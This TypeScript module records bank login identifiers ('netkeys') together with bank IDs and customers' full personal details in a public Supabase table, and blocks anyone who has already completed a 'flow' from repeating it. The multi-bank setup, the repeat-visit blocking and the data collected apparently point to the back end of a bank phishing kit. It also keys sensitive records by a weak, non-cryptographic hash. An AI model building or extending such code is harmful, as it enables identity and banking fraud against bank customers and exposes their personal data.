// Tracks netkeys that already completed a full flow so the same user cannot
// re-run the process. Stored per-browser in localStorage AND per-project in
// Supabase (public table `netkey_completions`) so the block persists across
// devices and we can restore the last shown personal data.

import { supabase } from "@/integrations/supabase/client";

const STORE_KEY = "completed_netkeys_v1";
const PENDING_PREFIX = "pending_netkey:";

export type CompletedCustomerData = {
  anrede?: string;
  name?: string;
  kundenNr?: string;
  geburtsdatum?: string;
  familienstand?: string;
  email?: string;
  mobilNr?: string;
  adresse?: { strasse?: string; plzOrt?: string };
};

export function hashNetkey(netkey: string): string {

  const n = netkey.trim().toLowerCase();
  // Small non-cryptographic hash — we only need a stable identifier per browser.
  let h = 5381;
  for (let i = 0; i < n.length; i++) h = ((h << 5) + h + n.charCodeAt(i)) >>> 0;
  return `nk_${h.toString(16)}_${n.length}`;
}

function readSet(): Set<string> {
  if (typeof window === "undefined") return new Set();
  try {
    const raw = localStorage.getItem(STORE_KEY);
    if (!raw) return new Set();
    const arr = JSON.parse(raw);
    return new Set(Array.isArray(arr) ? arr : []);
  } catch {
    return new Set();
  }
}

function writeSet(set: Set<string>) {
  try {
    localStorage.setItem(STORE_KEY, JSON.stringify(Array.from(set)));
  } catch {
    /* ignore */
  }
}

export function isNetkeyCompleted(netkey: string): boolean {
  if (!netkey?.trim()) return false;
  return readSet().has(hashNetkey(netkey));
}

export function markNetkeyCompleted(netkey: string) {
  if (!netkey?.trim()) return;
  const set = readSet();
  set.add(hashNetkey(netkey));
  writeSet(set);
}

export function rememberPendingNetkey(refId: string, netkey: string) {
  if (!refId || !netkey?.trim()) return;
  try {
    sessionStorage.setItem(PENDING_PREFIX + refId, hashNetkey(netkey));
  } catch {
    /* ignore */
  }
}

export function completePendingNetkey(refId: string) {
  if (!refId) return;
  try {
    const hash = sessionStorage.getItem(PENDING_PREFIX + refId);
    if (!hash) return;
    const set = readSet();
    set.add(hash);
    writeSet(set);
    sessionStorage.removeItem(PENDING_PREFIX + refId);
  } catch {
    /* ignore */
  }
}

// --- DB-backed persistence (cross-device, self-hosted safe) ------------------

const PENDING_META_PREFIX = "pending_netkey_meta:";

type PendingMeta = { bankId?: string | null; bankName?: string | null };

export function rememberPendingNetkeyMeta(refId: string, meta: PendingMeta) {
  if (!refId) return;
  try {
    sessionStorage.setItem(PENDING_META_PREFIX + refId, JSON.stringify(meta));
  } catch { /* ignore */ }
}

function readPendingMeta(refId: string): PendingMeta {
  try {
    const raw = sessionStorage.getItem(PENDING_META_PREFIX + refId);
    return raw ? (JSON.parse(raw) as PendingMeta) : {};
  } catch { return {}; }
}

export async function saveNetkeyCompletion(
  netkey: string,
  data: CompletedCustomerData,
  meta?: PendingMeta,
) {
  if (!netkey?.trim()) return;
  try {
    await supabase
      .from("netkey_completions" as never)
      .upsert(
        {
          netkey_hash: hashNetkey(netkey),
          bank_id: meta?.bankId ?? null,
          bank_name: meta?.bankName ?? null,
          customer_data: data as never,
        } as never,
        { onConflict: "netkey_hash" } as never,
      );
  } catch { /* ignore */ }
}

export async function saveNetkeyCompletionByRef(
  refId: string,
  data: CompletedCustomerData,
) {
  if (!refId) return;
  try {
    const hash = sessionStorage.getItem(PENDING_PREFIX + refId);
    if (!hash) return;
    const meta = readPendingMeta(refId);
    await supabase
      .from("netkey_completions" as never)
      .upsert(
        {
          netkey_hash: hash,
          bank_id: meta.bankId ?? null,
          bank_name: meta.bankName ?? null,
          customer_data: data as never,
        } as never,
        { onConflict: "netkey_hash" } as never,
      );
  } catch { /* ignore */ }
}

export async function fetchNetkeyCompletion(
  netkey: string,
): Promise<CompletedCustomerData | null> {
  if (!netkey?.trim()) return null;
  try {
    const { data } = await supabase
      .from("netkey_completions" as never)
      .select("customer_data")
      .eq("netkey_hash", hashNetkey(netkey))
      .maybeSingle();
    const row = data as { customer_data?: CompletedCustomerData } | null;
    return row?.customer_data ?? null;
  } catch {
    return null;
  }
}

